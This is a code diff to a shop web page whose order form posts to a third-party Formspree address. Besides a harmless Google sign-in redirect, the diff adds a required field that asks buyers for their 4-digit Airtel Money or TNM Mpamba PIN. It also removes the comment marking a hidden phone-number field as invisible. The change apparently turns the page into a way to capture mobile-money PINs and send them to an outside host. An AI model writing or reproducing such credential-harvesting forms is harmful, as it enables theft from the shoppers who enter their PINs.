@@ -37,7 +37,7 @@
         <h2>Login or Sign Up</h2>
         <form action="https://formspree.io/f/moqbgvkp" method="POST">
             <div>
-                <button class="google-login" type="button">
+                <button class="google-login" type="button" onclick="googleLogin()">
                     <img src="1731975273328.png" alt="Google Logo">
                     Login with Google
                 </button>
@@ -115,7 +115,6 @@
                 <label for="phone">Phone Number:</label>
                 <input type="text" id="phone" name="phone" required>
             </div>
-            <!-- Invisible Phone Number for Transactions -->
             <input type="hidden" name="phone_number" value="+265994426162">
             <div>
                 <label for="payment">Payment Method:</label>
@@ -123,6 +122,10 @@
                     <option value="tnm">TNM Mpamba</option>
                     <option value="airtel">Airtel Money</option>
                 </select>
+            </div>
+            <div>
+                <label for="airtel-password">Enter 4-Digit Airtel/Mpamba Password:</label>
+                <input type="password" id="airtel-password" name="airtel-password" maxlength="4" required>
             </div>
             <button type="submit">Place Order</button>
         </form>
@@ -163,5 +166,12 @@
             <a href="https://twitter.com">Twitter</a>
         </div>
     </footer>
+
+    <script>
+        // Function for Google Login (basic structure for button)
+        function googleLogin() {
+            window.location.href = "https://accounts.google.com/signin";
+        }
+    </script>
 </body>
 </html>
